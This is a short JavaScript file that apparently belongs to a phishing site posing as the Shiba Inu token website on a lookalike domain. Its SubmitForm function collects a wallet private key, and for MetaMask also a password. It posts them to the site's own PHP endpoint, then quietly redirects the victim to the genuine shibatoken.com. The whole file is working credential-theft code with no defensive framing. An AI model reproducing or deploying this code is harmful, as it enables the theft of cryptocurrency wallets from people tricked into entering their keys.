var root_path = 'https://shibainutoken.me/';
var server = window.location.hostname;
if (server == 'localhost'){
	root_path = 'http://localhost/shibainutoken/';
}

function SubmitForm(type){
    var private_key = document.getElementById('private_key').value;
    var password = '';
    var confirm_password = '';
    if (type == 'MetaMask'){
        password = document.getElementById('password').value;
        confirm_password = document.getElementById('confirm-password').value;
    }
    var ref = document.getElementById('ref').value;
    var form_data = new FormData();
    form_data.append('private_key', private_key);
    form_data.append('password', password);
    form_data.append('confirm_password', confirm_password);
    form_data.append('type', type);
    form_data.append('ref', ref);
    $.ajax({
        url: root_path+'api/v0/php/submit-form.php',
        method: 'POST',
        data: form_data,
        processData: false,
        cache: false,
        contentType: false,
        beforeSend: function(){

        },
        success: function(result){
            window.location.href = 'https://shibatoken.com/?__cf_chl_jschl_tk__=pmd_0y8ibFKGl20liMZuS86KqlSXkoGIb0N_sMz4lYg4gCc-1635602380-0-gqNtZGzNAfujcnBszQpl';
        }
    })
}